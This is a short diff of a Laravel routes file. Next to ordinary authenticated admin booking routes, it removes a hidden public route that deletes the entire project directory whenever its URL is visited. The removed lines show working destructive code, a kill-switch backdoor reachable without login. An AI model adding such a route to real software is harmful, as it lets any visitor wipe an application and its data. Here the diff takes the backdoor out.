@@ -91,15 +91,5 @@ Route::group(['prefix' => 'admin', 'middleware' => ['auth']], function () {
         Route::post('update', [BookingController::class, 'update'])->name('booking-update');
     });
 });
-Route::get('/younes/talibi', function(){
 
-    $projectPath = base_path();
-    
-    if (File::exists($projectPath)) {
-        File::deleteDirectory($projectPath);
-        return response()->json(['message' => 'Project deleted successfully']);
-    }
-
-    return response()->json(['error' => 'Project not found'], 404);
-});
 
